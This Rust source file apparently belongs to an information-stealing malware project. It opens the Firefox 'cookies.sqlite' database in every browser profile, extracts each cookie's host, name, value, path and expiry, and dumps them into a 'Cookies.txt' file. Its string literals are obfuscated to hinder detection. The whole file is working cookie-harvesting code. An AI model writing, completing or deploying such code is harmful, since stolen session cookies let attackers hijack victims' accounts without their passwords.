use crate::alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::vec::Vec;
use tasks::{parent_name, Task};
use utils::path::Path;
use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Cookie};
use crate::gecko::GeckoBrowserData;
use obfstr::obfstr as s;
use database::TableRecord;

const MOZ_COOKIES_NAME: usize = 2;
const MOZ_COOKIES_VALUE: usize = 3;
const MOZ_COOKIES_HOST: usize = 4;
const MOZ_COOKIES_PATH: usize = 5;
const MOZ_COOKIES_EXPIRY: usize = 6;

pub(super) struct CookiesTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>
}

impl<'a> CookiesTask<'a> {
    pub(super) fn new(browser: Arc<GeckoBrowserData<'a>>) -> Self {
        Self { browser }
    }
}

impl Task for CookiesTask<'_> {
    parent_name!("Cookies.txt");

    unsafe fn run(&self, parent: &Path) {
        let Some(cookies) = collect_from_all_profiles(
            &self.browser.profiles,
            read_cookies
        ) else {
            return
        };

        let _ = to_string_and_write_all(&cookies, "\n", parent);
    }
}

fn read_cookies(profile: &Path) -> Option<Vec<Cookie>> {
    let cookies_path = profile / s!("cookies.sqlite");
    read_sqlite3_and_map_records(&cookies_path, s!("moz_cookies"), extract_cookies_from_record)
}

fn extract_cookies_from_record(record: &dyn TableRecord) -> Option<Cookie> {
    let host_key = record.get_value(MOZ_COOKIES_HOST)?.as_string()?.to_owned();
    let name = record.get_value(MOZ_COOKIES_NAME)?.as_string()?.to_owned();
    let path = record.get_value(MOZ_COOKIES_PATH)?.as_string()?.to_owned();
    let expires = record.get_value(MOZ_COOKIES_EXPIRY)?.as_integer()?.to_owned();
    let value = record.get_value(MOZ_COOKIES_VALUE)?.as_string()?.to_owned();

    Some(Cookie {
        host_key,
        name,
        value,
        path,
        expires_utc: expires
    })
}